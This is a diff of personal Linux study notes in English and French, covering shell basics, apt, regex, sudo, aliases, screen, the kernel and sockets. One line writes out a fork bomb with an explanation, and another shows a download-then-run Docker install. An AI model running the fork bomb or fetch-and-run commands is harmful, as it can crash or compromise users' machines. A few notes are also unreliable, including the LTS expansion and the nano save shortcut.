@@ -108,7 +108,7 @@ Data not to forget.
     + [Other ways of encoding / other encoding tables](#other-ways-of-encoding-/-other-encoding-tables)
     + [Building a server](#building-a-server)
   * [Other](#other)
-- [Computer networking - Theory](#computer-networking---theory)
+- [Computer Networking Theory](#computer-networking-theory)
   * [The OSI Model](#the-osi-model)
     + [Layer 1 - Physical layer](#layer-1---physical-layer)
     + [Layer 2 - Data Link layer](#layer-2---data-link-layer)
@@ -138,7 +138,7 @@ Data not to forget.
   * [Firewalls, proxies, reverse-proxies](#firewalls,-proxies,-reverse-proxies)
   * [DHCP](#dhcp)
   * [NAT](#nat)
-- [Computer Networking : Practice](#computer-networking-:-practice)
+- [Computer networking Practice](#computer-networking-:-practice)
   * [Configuring a switch](#configuring-a-switch)
   * [Configuring a router](#configuring-a-router)
     + [Physical routers](#physical-routers)
@@ -170,32 +170,32 @@ Data not to forget.
 
 #### Environment variables
 
-- Environnment variables all together can be accessec using ``printenv``.
-- They can be accessed individually with ``echo $VAR``.
+- Environnment variables all together can be accessec using `printenv`.
+- They can be accessed individually with `echo $VAR`.
 - What the different environment variables do and mean : (...)
-  * ``HOME=/home/sandwichgouda`` : value of `~`
-  * ``PWD`` : Print Working Directory
-  * ``OLDPWD`` : The previous Working Drirectory. Very useful ! ``cd $OLDPWD``
-  * ``TERM=xterm-256color`` ?
-  * ``LS_COLORS`` ?
+  * `HOME=/home/sandwichgouda` : value of `~`
+  * `PWD` : Print Working Directory
+  * `OLDPWD` : The previous Working Drirectory. Very useful ! `cd $OLDPWD`
+  * `TERM=xterm-256color` ?
+  * `LS_COLORS` ?
 - Do they / can they change depending on the distro ? On the Des
 
 #### Hard links and symbolic links
 
-Un lien symbolique (symlink) est un fichier qui pointe vers un (autre) fichier ou dossier. C'est un peu comme un raccourci (``.lnk``) sur Windows. Ils sont aussi appelés softlinks, car ils sont des pointeurs indirects, par opposition aux hardlinks qui pointent directement vers la data du disque. Ils peuvent pointer vers des fichiers qui sont sur d'autres systèmes de fichiers ou partitions. Le chemin peut être relatif ou absolu. Ils sont dits _broken_ (broken links) lorsque ce vers quoi ils pointent n'existe plus. Ils peuvent être utilisés pour éviter de dupliquer des fichiers ou dossiers, ou pour éviter d'avoir à préciser la version d'une commande ou d'un éxécutable à chaque fois qu'on l'éxécute. Ils sont créés avec la commande ``ln``. Attention, cette dernière crée des hard links par défaut, il faut utiliser ``--symbolic`` pour que le lien soit symbolique. (...)
+Un lien symbolique (symlink) est un fichier qui pointe vers un (autre) fichier ou dossier. C'est un peu comme un raccourci (`.lnk`) sur Windows. Ils sont aussi appelés softlinks, car ils sont des pointeurs indirects, par opposition aux hardlinks qui pointent directement vers la data du disque. Ils peuvent pointer vers des fichiers qui sont sur d'autres systèmes de fichiers ou partitions. Le chemin peut être relatif ou absolu. Ils sont dits _broken_ (broken links) lorsque ce vers quoi ils pointent n'existe plus. Ils peuvent être utilisés pour éviter de dupliquer des fichiers ou dossiers, ou pour éviter d'avoir à préciser la version d'une commande ou d'un éxécutable à chaque fois qu'on l'éxécute. Ils sont créés avec la commande `ln`. Attention, cette dernière crée des hard links par défaut, il faut utiliser `--symbolic` pour que le lien soit symbolique. (...)
 
 #### Super User
 
- ``sudo su``, or ``sudo -i``, allow to a sudoers (users that are sudo, that is part of the group sudo) to login as ``root``. That is, its terminal will from now on be logged in as root.  This creates a subshell : ``CTRL+D`` exits it in both cases. The difference between both commands is a question of shell environment and of environment variables. ``sudo -i`` provides a full login experience and simulates an environment as if you really just logged in as ``root``, while ``sudo su`` keeps you in your current environment with elevated privileges.  
+ `sudo su`, or `sudo -i`, allow to a sudoers (users that are sudo, that is part of the group sudo) to login as `root`. That is, its terminal will from now on be logged in as root.  This creates a subshell : `CTRL+D` exits it in both cases. The difference between both commands is a question of shell environment and of environment variables. `sudo -i` provides a full login experience and simulates an environment as if you really just logged in as `root`, while `sudo su` keeps you in your current environment with elevated privileges.  
  More precisely : 
-- ``sudo -i`` simulates a full root login shell (in particular, you actually have to log in)
-- ``sudo su`` switches to root without login environment.
-- ``sudo -i`` shanges to root's home directory (``/root``)
-- ``sudo su`` stays in the current working directory
-- ``sudo -i`` loads root user's login environment.	
-- ``sudo su`` keeps current user environment by default
-- ``sudo -i`` Loads root-specific profile files (e.g., .bashrc, .profile).	
-- ``sudo su`` Does not load root profile files unless sudo su - is used.
+- `sudo -i` simulates a full root login shell (in particular, you actually have to log in)
+- `sudo su` switches to root without login environment.
+- `sudo -i` shanges to root's home directory (`/root`)
+- `sudo su` stays in the current working directory
+- `sudo -i` loads root user's login environment.	
+- `sudo su` keeps current user environment by default
+- `sudo -i` Loads root-specific profile files (e.g., .bashrc, .profile).	
+- `sudo su` Does not load root profile files unless sudo su - is used.
 | Aspect | `sudo -i` | `sudo su` |
 |--------|-----------|-----------|
 | Shell Type | Simulates a full root login shell. | Switches to root without login environment. |
@@ -213,7 +213,7 @@ Linux distributions include :
 - Redhat
 - Gentoo
 - Fedora
-- NixOS (based on the ``nix`` package manager)
+- NixOS (based on the `nix` package manager)
 - Kali Linux
 - Oracle Linux
 - openSUSE-Tumbleweed
@@ -226,22 +226,22 @@ Desktop environments include :
 
 #### The shell
 
-When we speak of the command line, we are really referring to the **shell**. The shell is a program that takes keyboard commands and passes them to the operating system to treat. Almost all Linux distributions supply a shell program from the GNU Project called ``bash``. The name BASH is an acronym for Bourne Again Shell, a reference to the fact that bash is an enhanced replacement for SH, the original Unix shell program written by Steve Bourne. When using a graphical user interface, one needs another program called a **terminal emulator** to interact with the shell. Although, in desktop menus, it is most often called ``terminal``. The commands are written in what we call a **command prompt**. 
-* In KDE, the terminal is emulated by ``Konsole``
-* In GNOME, the terminal emulated by ``GNOME terminal``
-* In XFCE, the terminal is emulated by ``xfce4 terminal``
-* In the [X Window System](https://www.x.org/wiki/), the terminal is emulated by [``xterm``](https://invisible-island.net/xterm/).
+When we speak of the command line, we are really referring to the **shell**. The shell is a program that takes keyboard commands and passes them to the operating system to treat. Almost all Linux distributions supply a shell program from the GNU Project called `bash`. The name BASH is an acronym for Bourne Again Shell, a reference to the fact that bash is an enhanced replacement for SH, the original Unix shell program written by Steve Bourne. When using a graphical user interface, one needs another program called a **terminal emulator** to interact with the shell. Although, in desktop menus, it is most often called `terminal`. The commands are written in what we call a **command prompt**. 
+* In KDE, the terminal is emulated by `Konsole`
+* In GNOME, the terminal emulated by `GNOME terminal`
+* In XFCE, the terminal is emulated by `xfce4 terminal`
+* In the [X Window System](https://www.x.org/wiki/), the terminal is emulated by [`xterm`](https://invisible-island.net/xterm/).
 
-- In a shell, the last character should be either a hash mark (``#``) or a dollar sign (``$``). The hash mark means the current user has Super User privileges.
-- The X Window System, also called X11 or just X, (an underlying engine that makes the GUI go) supports a quick copy-and-paste technique : when highlighting some text, it is copied into a buffer maintained by X. Then, a middle mouse button click (or right-click, on Windows, and maybe also in some other terminal emulators). ``CTRL+C`` and ``CTRL+V`` do not work (use ``CTRL+SHIFT+C`` and ``CTRL+SHIFT+V``).
+- In a shell, the last character should be either a hash mark (`#`) or a dollar sign (`$`). The hash mark means the current user has Super User privileges.
+- The X Window System, also called X11 or just X, (an underlying engine that makes the GUI go) supports a quick copy-and-paste technique : when highlighting some text, it is copied into a buffer maintained by X. Then, a middle mouse button click (or right-click, on Windows, and maybe also in some other terminal emulators). `CTRL+C` and `CTRL+V` do not work (use `CTRL+SHIFT+C` and `CTRL+SHIFT+V`).
 - There are actually several shells, i.e. there exist several programs, developped by different people, that are [Unix shells](https://en.wikipedia.org/wiki/Unix_shell) :
-  * ``sh`` : Bourne Shell
-  * ``ksh`` : KornShell 
-  * ``csh`` : C Shell
-  * ``tcsh`` ("T-Shell", "TC-Shell" or "TSCH") : TENEX C Shell
-  * ``bash`` : Bourne Again Shell
-  * ``zsh`` : Z Shell
-  * ``PowerShell`` : Originally developed for Windows and now available to macOS and Linux.
+  * `sh` : Bourne Shell
+  * `ksh` : KornShell 
+  * `csh` : C Shell
+  * `tcsh` ("T-Shell", "TC-Shell" or "TSCH") : TENEX C Shell
+  * `bash` : Bourne Again Shell
+  * `zsh` : Z Shell
+  * `PowerShell` : Originally developed for Windows and now available to macOS and Linux.
 
 For further investigation : 
 - [Comparison of command shells](https://en.wikipedia.org/wiki/Unix_shell)
@@ -272,11 +272,11 @@ For further investigation :
 
 #### Virtual terminals
 
-Even if one ha no terminal emulator running, several terminal sessions continue to run behind the graphical desktop. Called _virtual terminals_ or _virtual consoles_, these sessions can be accessed on most Linux distributions with ``CTRL+ALT+F1`` to ``CTRL+ALT+F6`` on most systems. When a session is accessed, it presents a login prompt into which we can enter our username and password. To switch from one virtual console to another, press ``ALT`` and ``F1``-``F6``. To return to the graphical desktop, press ALT-F7.
+Even if one ha no terminal emulator running, several terminal sessions continue to run behind the graphical desktop. Called _virtual terminals_ or _virtual consoles_, these sessions can be accessed on most Linux distributions with `CTRL+ALT+F1` to `CTRL+ALT+F6` on most systems. When a session is accessed, it presents a login prompt into which we can enter our username and password. To switch from one virtual console to another, press `ALT` and `F1`-`F6`. To return to the graphical desktop, press ALT-F7.
 
 #### OOM-killer score
 
-Quand la RAM sature, le noyau Linux ``kill`` un des process en cours d'éxécution. Mais lequel ? Pour déterminer quel process tuer, Linux utilise une heuristique (badness heuristic) qui attribue un score (OOM-killer score)(OOM pour Out Of Memory) entre 0 (never kill) et 1000 (always kill). Le process ayant l'OOM-killer score le plus élevé est tué. L'OOM-killer score est _roughly_ le pourcentage de RAM utilisée par chaque process par rapport à sa RAM allouée. Par exemple, si un process utilise 50% de sa RAM allouée, son OOM-killer score sera de 500. La commande ``choom`` permet d'afficher et de modifier les OOM-killer score.
+Quand la RAM sature, le noyau Linux `kill` un des process en cours d'éxécution. Mais lequel ? Pour déterminer quel process tuer, Linux utilise une heuristique (badness heuristic) qui attribue un score (OOM-killer score)(OOM pour Out Of Memory) entre 0 (never kill) et 1000 (always kill). Le process ayant l'OOM-killer score le plus élevé est tué. L'OOM-killer score est _roughly_ le pourcentage de RAM utilisée par chaque process par rapport à sa RAM allouée. Par exemple, si un process utilise 50% de sa RAM allouée, son OOM-killer score sera de 500. La commande `choom` permet d'afficher et de modifier les OOM-killer score.
 
 #### Regex
 
@@ -284,59 +284,59 @@ Regular Expressions (often abbreviated as Regex, or Regexp), are expressions tha
 
 ##### Regex Meta-characters
 
-- ``.`` : Matches any single character except a newline character (``\n``)
-- ``*`` : Matches 0 or more of the preceding element.
-- ``?`` : Matches 0 or 1 of the preceding element.
-- ``[]`` : Matches any one of the characters inside the brackets.
-  * ``[a-z]`` matches any lowercase letter.
-  * ``[A-Z]`` matches any uppercase letter.
+- `.` : Matches any single character except a newline character (`\n`)
+- `*` : Matches 0 or more of the preceding element.
+- `?` : Matches 0 or 1 of the preceding element.
+- `[]` : Matches any one of the characters inside the brackets.
+  * `[a-z]` matches any lowercase letter.
+  * `[A-Z]` matches any uppercase letter.
   * [0-9] matches digits
   * [a-zA-Z0-9_] matches numbers, digits, and underscores.
-- ``[^]`` : Matches any character **except** the ones inside the brackets. ``^`` basically means negation.
-- ``^`` : Matches the beginning of a line.
-- ``$`` : Matches the end of a line.
-- ``{n}`` : Matches ``n`` occurences of the preceding element. ``n`` must be given in decimal (not a literal value).
-- ``{n,m}`` : Matches any ``k`` occurences of the preceding element, for any $n \leqslant k \leqslant m$.
-- ``{n,}`` : Matches any ``k`` occurences of the preceding element, for any $k \geqslant n$.
-- ``{,m}`` : Matches any ``k`` occurences of the preceding element, for any $k \leqslant m$.
-- ``\`` : Escapes special characters to treat them as literals.
-- Parenthesis ``()`` allow to group things.
-- ``...|...`` : Matches either the left or the right hand side of the pipe.
-  * Note : By default, ``...|...`` is prioritized as ``(...)|(...)`` (see example above :).
-  * To apply the logical ``OR``to only some part of the pattern, use ``...(..|..)...``
+- `[^]` : Matches any character **except** the ones inside the brackets. `^` basically means negation.
+- `^` : Matches the beginning of a line.
+- `$` : Matches the end of a line.
+- `{n}` : Matches `n` occurences of the preceding element. `n` must be given in decimal (not a literal value).
+- `{n,m}` : Matches any `k` occurences of the preceding element, for any $n \leqslant k \leqslant m$.
+- `{n,}` : Matches any `k` occurences of the preceding element, for any $k \geqslant n$.
+- `{,m}` : Matches any `k` occurences of the preceding element, for any $k \leqslant m$.
+- `\` : Escapes special characters to treat them as literals.
+- Parenthesis `()` allow to group things.
+- `...|...` : Matches either the left or the right hand side of the pipe.
+  * Note : By default, `...|...` is prioritized as `(...)|(...)` (see example above :).
+  * To apply the logical `OR`to only some part of the pattern, use `...(..|..)...`
 
 ##### Special character classes
 
-- ``\d`` : Matches any digit : [0-9]
-- ``\w`` : Matches any word character : letters, digits, and underscore : [a-zA-Z0-9_]
-- ``\s`` : Matches any whitespace character : spaces, tabs, newlines.
-- ``\D`` : Matches any non-digit character : [^0-9]
-- ``\W`` : Matches any non-word character : [^a-zA-Z0-9_]
-- ``\S`` : Matches any non-whitespace character.
-- ``\b`` : Matches a position where a word boundary occurs, i.e., the position between a word character (letter, digit, or underscore : [a-zA-Z0-9_]) and a non word character (whitespace, punctuation...)
-- ``\B`` : Matches a position that is NOT a word boundary.
+- `\d` : Matches any digit : [0-9]
+- `\w` : Matches any word character : letters, digits, and underscore : [a-zA-Z0-9_]
+- `\s` : Matches any whitespace character : spaces, tabs, newlines.
+- `\D` : Matches any non-digit character : [^0-9]
+- `\W` : Matches any non-word character : [^a-zA-Z0-9_]
+- `\S` : Matches any non-whitespace character.
+- `\b` : Matches a position where a word boundary occurs, i.e., the position between a word character (letter, digit, or underscore : [a-zA-Z0-9_]) and a non word character (whitespace, punctuation...)
+- `\B` : Matches a position that is NOT a word boundary.
 
 ##### Examples
 
-- ``h.t`` matches ``hit``, ``hot``, ``hat``... any thre character sequence of the form ``h_t``.
-- ``ho*t`` matches ``ht``, ``hot``, ``hoot``, ``hooot``, ..., ``hooooooooot``, ...
-- ``ho?t``matches ``ht`` and ``hot``.
-- ``h[aeiou]t`` matches ``hat``, ``hit``, ``hot``, ``hut`` and ``het``.
-- ``h[^aeiou]t`` matches any word of the form ``h.t`` except ``hat``, ``hit``, ``hot``, ``hut``, ``het``
-- ``^hello`` matches any line starting with ``hello``.
-- ``world$`` matches any line ending with ``world``.
-- ``ho{19}t`` matches only ``hooooooooooooooooooot`` (here ``o`` appears 19 times).
-- ``ho{2,19}t`` matches ``hoot``, ``hooot``, ...,  ``hooooooooooooooooooot`` (here ``o`` appears 19 times again).
-- ``\+``matches ``+``, ``\.``matches ``.``, ``\?``matches ``?``, ...
-- ``cat|dog`` matches both ``cat`` and ``dog``.
-- ``(c|d)og`` matches ``cog`` and ``dog``.
-- ``\bword\b`` matches "word" as a standalone word, i.e., does not match  "sword" or "wording".
-- ``\Bword`` matches ``sword``, but not ``word``.
-- ``word\B`` matches ``wordy``, but not ``word``.
+- `h.t` matches `hit`, `hot`, `hat`... any thre character sequence of the form `h_t`.
+- `ho*t` matches `ht`, `hot`, `hoot`, `hooot`, ..., `hooooooooot`, ...
+- `ho?t`matches `ht` and `hot`.
+- `h[aeiou]t` matches `hat`, `hit`, `hot`, `hut` and `het`.
+- `h[^aeiou]t` matches any word of the form `h.t` except `hat`, `hit`, `hot`, `hut`, `het`
+- `^hello` matches any line starting with `hello`.
+- `world$` matches any line ending with `world`.
+- `ho{19}t` matches only `hooooooooooooooooooot` (here `o` appears 19 times).
+- `ho{2,19}t` matches `hoot`, `hooot`, ...,  `hooooooooooooooooooot` (here `o` appears 19 times again).
+- `\+`matches `+`, `\.`matches `.`, `\?`matches `?`, ...
+- `cat|dog` matches both `cat` and `dog`.
+- `(c|d)og` matches `cog` and `dog`.
+- `\bword\b` matches "word" as a standalone word, i.e., does not match  "sword" or "wording".
+- `\Bword` matches `sword`, but not `word`.
+- `word\B` matches `wordy`, but not `word`.
 
 #### Shell wildcard patterns 
 
-They can be used in the terminal or in ``*`` : all
+They can be used in the terminal or in `*` : all
 
 #### Setting up external hard drives
 
@@ -357,7 +357,7 @@ Then use parted to create a partition and format the disk.
 
 #### NixOS
 
-NixOS is a distribution based on the Niw package manager. It is special in it's package management and configuration systems. NixOS is the package manager that has the most package. 
+NixOS is a distribution based on the Nix package manager. It is special in it's package management and configuration systems. NixOS is the package manager that has the most package. 
 
 The NixOS repo
 
@@ -367,10 +367,11 @@ AUR repo
 
 ##### Configurations in NixOS
 
-All configurations options can be written in ``/etc/nixos/configuration.nix``.
+All configurations options can be written in `/etc/nixos/configuration.nix`.
 
 ### Dual boots
 
+- At each boot, the bootloader, often GRUB, allows to choose (and chooses) between several OS to boot.
 - To create a dual boot, you must reduce the partition. Use the Disk manager on Windows to do that. 100Go is a good amount to install and use a Linux distribution.
 - NTFS the the (only) Windows File System Manager. It is the only one on Windows that allows to make disk partition reductions. FAT32, EXT4 are other File Systems.
 - BitLocker is on Windows by default. It is a disk cyphering system. 
@@ -378,69 +379,71 @@ All configurations options can be written in ``/etc/nixos/configuration.nix``.
 
 ### Linux miscellaneous things
 
-- ``cd``is a shell built-in command. It is not like other commands. For instance you cannot do ``man cd``. (Any other differences ?)
-- One gives several arguments to a command by separating them with commas. Example : ``htop --pid 1,2,3``
-- Remember to ``(sudo) apt update`` from time to time !
+- `cd`is a shell built-in command. It is not like other commands. For instance you cannot do `man cd`. (Any other differences ?)
+- One gives several arguments to a command by separating them with commas. Example : `htop --pid 1,2,3`
+- Remember to `(sudo) apt update` from time to time !
 - LTS = Last Stable Release
-- ``.bashrc`` (on BASH shells), or ``.zrc`` (on ZSH shells), is a script that is executed each time a user logs in. 
-  * Adding the line ``export PATH=$PATH:/usr/local/go/bin`` in it allows to (permanently) add environment variables, for a given user.
-- If you get a ``Permission denied`` error trying to remove something while logged in as ``root`` and/or using ``sudo``, it might be because what you're deleting is used by a process (In other words : "This cannot be removed because it's used by ... ; please close it"). (that's one of a kind of silent error)
+- If you get a `Permission denied` error trying to remove something while logged in as `root` and/or using `sudo`, it might be because what you're deleting is used by a process (In other words : "This cannot be removed because it's used by ... ; please close it"). (that's one of a kind of silent error)
 - To install docker easily : 
-  * ``wget get.docker.com``
-  * This downloads ``index.html``
-  * When using ``cat``, you can see ``index.html``is actually a bash script !
-  * -> ``bash index.html`` installs docker
-- ``:(){ :|:& };:`` is a fork bomb. A fork bomb (or rabbit virus) is a denial-of-service (DoS) attack wherein a process continually replicates (forks) itself to deplete available system resources, slowing down or crashing the system due to resource starvation.
+  * `wget get.docker.com`
+  * This downloads `index.html`
+  * When using `cat`, you can see `index.html`is actually a bash script !
+  * -> `bash index.html` installs docker
+- `:(){ :|:& };:` is a fork bomb. A fork bomb (or rabbit virus) is a denial-of-service (DoS) attack wherein a process continually replicates (forks) itself to deplete available system resources, slowing down or crashing the system due to resource starvation.
 
 ### Linux package managers
 
-- ``dpkg`` stands for Debian Package Manager.
-- It is actually used and embedded into ``apt``
-- ``apt`` is a frontend that simplifies the usage of APT by combining ``dpkg``, ``apt-cache``, ``apt-get``, ``apr-mark``, ``apt-file``, and more.
+- `dpkg` stands for Debian Package Manager.
+- It is actually used and embedded into `apt`
+- `apt` is a frontend that simplifies the usage of APT by combining `dpkg`, `apt-cache`, `apt-get`, `apr-mark`, `apt-file`, and more.
 - You can use local mirrors to be able to work 100% offline !
+- `apt` is the package manager for Ubuntu/Debian
+- `pacman` is the package manager on Arch 
+- `yum` is the one for Redhat/Fedora
 
 #### How APT Works
 
-APT refers to a list of package available at ``https://packages.ubuntu.com/`` (...)
+APT refers to a list of package available at `https://packages.ubuntu.com/` (...)
 
 #### APT Subcommands
 
-- ``apt``
-  * ``apt search`` searches and prints the list of packages containing the 
-- ``tree``
-  * ``tree -L 2`` : maximum depth = 2
-- ``apt``
-  * ``apt``
-    + ``apt search``
-    + ``
-  * ``dpkg``
-  * ``apt-get``
-  * ``apt-cache``
-  * ``apt-mark``
-    + ``apt-mark showmanual`` (supposedly) shows the list of all manually installed WSL packages. There are, actually, more packages printed than that. See [Linux packages](#linux-packages) for more info.
-
-- ``apt-file search`` seemingly works better than ``apt search``
-- If the installation of a package fails : ``sudo apt install pip --fix-missing`` ; ``sudo apt --fix-broken install`` 
-- ``dpkg -L packagename`` displays exacly all files added to the system after installing packagename. In particular, ``dpkg -L packagename | grep /usr/bin`` should display all commands newly installed !
+- `apt`
+  * `apt search` searches and prints the list of packages containing the 
+- `tree`
+  * `tree -L 2` : maximum depth = 2
+- `apt`
+  * `apt`
+    + `apt search`
+    + `
+  * `dpkg`
+  * `apt-get`
+  * `apt-cache`
+  * `apt-mark`
+    + `apt-mark showmanual` (supposedly) shows the list of all manually installed WSL packages. There are, actually, more packages printed than that. See [Linux packages](#linux-packages) for more info.
+- `apt-file search` seemingly works better than `apt search`
+- If the installation of a package fails : `sudo apt install pip --fix-missing` ; `sudo apt --fix-broken install` 
+- `dpkg -L packagename` displays exacly all files added to the system after installing packagename. In particular, `dpkg -L packagename | grep /usr/bin` should display all commands newly installed !
+- `apt upgrade` upgrades installed packages. It does not remove anything or install anything more than what's not installed.
+- `apt-get dist-upgrade` does what upgrade does while also intelligently handling changing dependencies with new versions. It a "smart" conflict resolution system, and it will attempt to upgrade the most important packages at the expense of less important ones if necessary. _Bref_, it is better.
 
 ### Linux base system commands and options
 
-#### ``man``
+#### `man`
 
 - Read the first lines of the manual - the DESCRIPTION section, it is often enlightening !
 - It is possible to move sideways using the left and right arrow keys ! 
-- Press ``h`` while in a man page to display help, in particular navigation and searching help.
-- Type ``/`` while in a man page to open Search Forward. 
+- Press `h` while in a man page to display help, in particular navigation and searching help.
+- Type `/` while in a man page to open Search Forward. 
   * Type in a keyword or a regular expression, press ENTER when finished.
   * Pressing ENTER will search forward for next occurence. 
-  * Pressing ``N`` will search for the next occurence of the regex.
-  * Pressing ``SHIFT+N`` will search for the previous occurence of the regex.
-- Type ``?`` while in a man page to open Search Backward. 
-  * It works the same as Search Foward, but seaches backwards when pressing ``ENTER``.
-  * You can always use ``N`` and ``SHIFT+N`` to find next and previous occurences.
-- Press ``D`` to go down **half a page**. Press ``U`` to go up **half a page**.
+  * Pressing `N` will search for the next occurence of the regex.
+  * Pressing `SHIFT+N` will search for the previous occurence of the regex.
+- Type `?` while in a man page to open Search Backward. 
+  * It works the same as Search Foward, but seaches backwards when pressing `ENTER`.
+  * You can always use `N` and `SHIFT+N` to find next and previous occurences.
+- Press `D` to go down **half a page**. Press `U` to go up **half a page**.
 
-#### ``df``
+#### `df`
 
 Reports file system disk space usage by showing the current amount of free space on each disk drive.
 
@@ -558,6 +561,18 @@ This command changes the login shell of a given user.
 - **An account with a restricted login shell may not change her login shell.** 
 - For this reason, placing /bin/rsh in /etc/shells is discouraged since accidentally changing to a restricted shell would prevent the user from ever changing her login shell back to its original value!
 
+#### `.bashrc` and `.profile`
+
+- `.profile` is a script that's executed each time a user logs into the system (login shell)
+  * `.profile` is loaded only once, at login (login shell),
+  * for instance when opening an SSH session, _bref_, whenever logging in.
+  * People typically set environment variables (commands to add them on each session) in this file.
+- `.bashrc` is also a script, but its purpose is different. 
+  * It's executed each time user opens a new terminal window or new interactive shell (terminal emulators, subshells)(non-login shell)
+  * It's also **sourced** by `.profile` on logging in. 
+  * `.bashrc` is loaded every time a new terminal session is opened (non-login shell)
+  * People typically set up interactive shell behaviors in it (e.g., aliases, prompt...)
+
 #### `/etc/shells`
 
 - This file lists valid login shells on the current OS.
@@ -671,6 +686,25 @@ This command changes the login shell of a given user.
   * For instance, `somecommand` could be `cat file`. :)
   * On the reciever machine, `nc -l -p 12345 > received_file` will store the recieved data into `received_file`. :)
 
+#### `alias` 
+
+- Aliases in Linux are used to replace some commands by some others (often simpler ones.)
+- For instance : `alias ls='ls --group-directories-first'` will run `ls --group-directories-first` each time the user writes `ls`.
+- It looks like in this case, options (such as `--group-directories-first` in the previous example) will be applied by default on each use of `ls` 
+- i.e., even if other options are applied (rather than only applying only when `ls` is used alone, without any other options)
+- Aliases only work for the current login session (!)
+- So what's typycally done is to write them in `.bashrc`, the file that's executed on each login session start.
+- If the shell is `zsh`, it should be put in `.zrc` (obviously)
+- You can deal with command arguments by adding `$1`, `$2`, ... in the alias.
+- If the arguments involve quotation marks, it might not work. Use a function, like so :
+```
+gitpush() {
+  git add .
+  git commit -m "$1"
+  git push
+}
+```
+
 #### Other small commands
 
 - ``date`` : Prints the date of the machine you are working on. You can specify an output format (see manual).
@@ -756,12 +790,19 @@ This command changes the login shell of a given user.
 - ubuntu-minimal
 - ubuntu-standard
 
+#### Nano
+
+- When in nano, `CTRL + X` `Y` `ENTER` saves and exists.
+- `CTRL + X` `N` saves and exists.
+- `CTRL + K` allows to _cut_ large chunks of text. 
+- In particular, `CTRL + K` allows to _remove_ large chunks of code !
+
 #### Tldr
 
 - TLDR shows shortened manpages for commands with _pratically useful_ and **relevant** examples.
 - As opposed to `man`, despite which's honourable effort to help users, is much less easy to read.
 
-### Cron
+#### Cron
 
 - Cron is used to perform some tasks as precise given times
 - For instance, running a script everyday at a given hour.
@@ -781,6 +822,21 @@ The difference between xpopple, poppler and xpdf is quite subtle (and historical
 
 _Bref_, these are PDF viewers widely used on Linux Desktop Environments such as GNOME or KDE.
 
+#### Screen
+
+- Screen is a terminal multiplexer, i.e. it allows to run separate shells (in separate processes) and, in particular. 
+- Remember that when you run a command in a shell, it will execute a program as a process which will be a child-process of your shell. This implies that if your shell is a remote shell (typically, connected using SSH), since the shell process is killed as soon as the connexion is stopped, all its subprocesses will be killed too and the programm will be killed. This way, for instance, you can't have a persistent program launched (without having it attached to the terminal - even by running it in the background by using `command &`). 
+- Terminal multiplexers allow to run processes without them being a child process of your shell.
+- `screen -S <name>` creates a screen
+- `screen` starts a new screen session
+- `screen -r` reattach to existing session
+- `screen -ls` List existing screen sessions
+- `Ctrl-A d` **detach from the current session**
+- `Ctrl-A c` Create a new window
+- `Ctrl-A n` Switch to the next window
+- `Ctrl-A p` Switch to the previous window
+- `Ctrl-A k` Kill the current window
+
 ### Commands cool things
 
 - (pipe, double pipe, <, >, <<, >>)
@@ -796,9 +852,55 @@ _Bref_, these are PDF viewers widely used on Linux Desktop Environments such as 
 
 ### The kernel
 
-The kernel is a first interface between hardware and software. It is the "core" of the OS. The kernel manages processes, I/O, along with many other things. It has complete control on the system.
+- The kernel is a first interface between hardware and software. It is the "core" of the OS. The kernel manages processes, I/O, along with many other things. It has complete control on the system.
+- Fundamentally, a kernel is just a piece of software. Heuristically, we call it "kernel" because it is at the core of the Operating System in the sense that it has control on all the system and manages many things. Applications and the (rest of the) OS make syscalls (calls to the kernel) to "ask for permission" to do stuff on the hardware (writing stuff in the RAM, for instance). 
+- A syscall happens when any piece of software needs access to anything related to hardware. The kernel may refuse it. By default, the OS is in "user mode". If the syscall is accepted, the OS passes in "Kernel mode" the time necessary to do the stuff (and then switches back to user mode). When in user mode, the OS and applications don't have permissions to do everything.
 
-Fundamentally, a kernel is just a piece of software. Heuristically, we call it "kernel" because it is at the core of the Operating System in the sense that it has control on all the system and manages many things. Applications and the (rest of the) OS make syscalls (calls to the kernel) to "ask for permission" to do stuff on the hardware (writing stuff in the RAM, for instance). A syscall happens when any piece of software needs access to anything related to hardware. The kernel may refuse it. By default, the OS is in "user mode". If the syscall is accepted, the OS passes in "Kernel mode" the time necessary to do the stuff (and then switches back to user mode). When in user mode, the OS and applications don't have permissions to do everything.
+### I/O and drivers
+
+- Drivers are necessary to handle some input. 
+- A driver teaches the operating system to handle some specific i/o with peripheral devices. 
+- Many drivers are already installed by default.
+  * The most common ones are HID (Human Interface Devices) drivers and Mass Storage drivers.
+  * These are "subnorms" of the USB norm. 
+  * The HID drivers are used for handling devices such as keyboard, mouses...
+  * The mass storage devices are used for handling mass storage devices such as USB sticks, (internal or external) hard drives...
+  * The reason why connecting a keyboard, a mouse or a storage device on a computer always works on first try is that these drivers are **installed by default** on most (every) Operating Systems (for ovious reasons : everyone needs at least a keyboard, and it is quite obvious that almost everyone will want to plug a mouse or a hard drive to their PC)
+  * But, sometimes some peripherals require to manually install drivers. For instance, for serial communication, you will likely need a Serial-USB driver to teach to your OS how to handle serial communication on USB ports.
+  * Drivers can be seen as extensions to your OS.
+  * For futher investigation, read the wikipedia page for USB. 
+  * But also, recall and don't forget  that the USB norm is over 500 pages long.
+
+### Sockets
+
+- Sockets are an abstraction. They are used to receive data over a network.
+- What we refer to as sockets are the piece of code (of program) that acts as **communication endpoints** :
+- Sockets are what sends and recieves data. 
+- They are identified by an IP address and a port number : for instance, 192.168.1.1:8080.
+- The operating system binds applications to sockets, hence, in this way, binds applications to ports.
+- This way, the Operating System knows which application it must redirect packets to.
+- Indeed : when the OS recieves (via its NIC) a packet on a given port, how does it know which application should be the actual recipient of this packet ?
+- At a low level, at their core, sockets are application programming interfaces (API) provided by the operating system (On Unix/Linux : Berkeley Sockets, on Windows : Winsock).
+- So, when two application want to communicate, here's what happens :
+  * On the server side, a socket is created and bound to an IP address and port.
+  * (Note that it is more correct to say that the OS binds sockets to an IP and a port - rather than saying that an application is. But whatever.)
+  * The server listens for incoming connections.
+  * A client creates a socket and attempts to connect to the server.
+  * Once a connection is established, the two sockets (client and server) can exchange data.
+  * Note : the server will listen on a given fixed port - typically such as 80 or 443.
+  * The client, however (the client's OS), will also bind a socket to an IP and a port - but note that this time, the port is random.
+  * As a matter of fact, **source ports are random**. When an application wants to send data - typically, a request to a server, the OS binds a socket to a port. 
+  * This port is random. Because, why not.
+  * When the server responds, the source and destination ports are swapped (normal !).
+- Sockets must not be confused with Websocket.
+  * Websocket(s) is a communication protocol. 
+  * It basically serves the same function as HTTP.
+  * It works over TCP.
+  * The difference with HTTP is that it provides a simultaneous two-way (duplex) communication channel over a single TCP connection.
